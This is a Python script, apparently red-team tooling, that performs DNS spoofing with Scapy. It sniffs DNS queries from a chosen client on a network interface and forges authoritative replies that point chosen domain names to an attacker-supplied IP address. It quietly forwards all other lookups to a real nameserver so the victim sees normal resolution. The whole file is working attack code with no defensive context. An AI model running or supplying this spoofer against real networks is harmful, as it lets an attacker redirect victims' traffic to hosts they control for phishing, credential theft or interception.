#!/usr/bin/env python3

# References:
# https://jasonmurray.org/posts/2020/scapydns/

# Import scapy libraries
from scapy.all import *
import argparse
import dns.resolver as dnsresolver

parser = argparse.ArgumentParser(description="DNS Spoofing")
parser.add_argument("-i", "--iface", type=str, required=True, help="interface to sniff")
parser.add_argument("-sh", "--srchost", type=str, required=True, help="hostname of client performing DNS request")
parser.add_argument("-si", "--srcip", type=str, required=True, help="IP address of client performing DNS request")
parser.add_argument("-dhs", "--dsthosts", nargs='+', type=str, required=True, help="list of domain names to spoof")
parser.add_argument("-di", "--dstip", type=str, required=True, help="IP address to resolve all domain names requested")
parser.add_argument("-ns", "--nameserver", type=str, default='168.63.129.16', help="Nameserver to use to resolve any other DNS request. Default value is Azure DNS IP address 168.63.129.16")
args = parser.parse_args()

net_interface = args.iface
src_ipaddress = args.srcip
src_hostname = args.srchost
dst_hostnames = args.dsthosts
dst_ipaddress = args.dstip
dns_nameserver = args.nameserver

# Berkeley Packet Filter for sniffing specific DNS packet only
packet_filter = " and ".join([
  "udp dst port 53",          # Filter UDP port 53
  "udp[10] & 0x80 = 0",       # DNS queries only
  f"src host {src_ipaddress}"
])

# Function that replies to DNS query
def dns_reply(packet):
    # Send the DNS response
    queried_host = (packet.qd.qname[:-1].decode("utf-8")).lower()
    if src_hostname in queried_host or 'localhost' in queried_host:
      print(f"[+] Hardcoding Local DNS request: {queried_host}")
      resolved_ip = src_ipaddress
    elif 'in-addr.arpa' in queried_host:
      print(f"[+] Hardcoding in-addr.arpa DNS request: {queried_host}")
      ip_array = (queried_host.split('.in-addr.arpa')[0]).split('.')
      ip_array.reverse()
      resolved_ip = '.'.join(ip_array)
    elif any(keyword in queried_host for keyword in dst_hostnames):
      print(f"[+] Spoofing DNS request: {queried_host}")
      resolved_ip = dst_ipaddress
    else:
      print(f"[+] Forwarding DNS request {queried_host} to {dns_nameserver}")
      my_resolver = dnsresolver.Resolver()
      my_resolver.nameservers = [dns_nameserver]
      a_records = my_resolver.query(queried_host)
      resolved_ip = a_records[0].address
    # Construct the DNS packet
    # Construct the Ethernet header by looking at the sniffed packet
    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )

    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )

    # Construct the UDP header by looking at the sniffed packet
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    # Construct the DNS response by looking at the sniffed packet and manually
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=DNSRR(
            rrname=packet[DNS].qd.qname,
            type='A',
            ttl=10,
            rclass='IN',
            rdata=resolved_ip)
        )

    # Put the full packet together
    response_packet = eth / ip / udp / dns

    # Send the DNS response
    sendp(response_packet, iface=net_interface)

# Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
print("[*] Sniffing DNS traffic..")
sniff(filter=packet_filter, prn=dns_reply, iface=net_interface, count=20)
